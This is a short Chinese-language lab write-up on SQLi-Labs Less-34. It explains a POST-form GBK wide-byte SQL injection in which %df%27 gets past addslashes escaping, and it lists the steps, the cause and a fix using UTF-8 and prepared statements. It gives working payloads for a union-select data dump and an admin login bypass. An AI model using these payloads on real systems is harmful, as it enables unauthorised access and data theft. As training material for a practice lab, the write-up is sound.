# SQLi-Labs | Less-34 POST 宽字节注入 表单 %df%27
## 一、漏洞简介
POST表单注入，uname参数被addslashes转义，GBK宽字节注入，%df%27逃逸单引号。
## 二、环境信息
靶场地址：http://127.0.0.1/sqli-labs/
关卡路径：/Less-34/
注入类型：POST、宽字节注入、GBK
## 三、复现步骤
1. BP抓包POST数据，uname输入1'被转义。
2. URL编码%df%27放入uname，宽字节逃逸。
3. 联合查询脱库或者绕过登录。
## 四、Payload
uname=%df%27 union select 1,version() --+ & passwd=1
绕过登录：uname=admin%df%27 --+ & passwd=1
## 五、漏洞原理
POST参数addslashes转义，数据库GBK编码，宽字节逃逸。
## 六、修复方案
1. UTF-8字符集，预编译查询。
## 七、总结
Less34是POST型宽字节注入，注入点在表单，GET和POST的宽字节都需要掌握。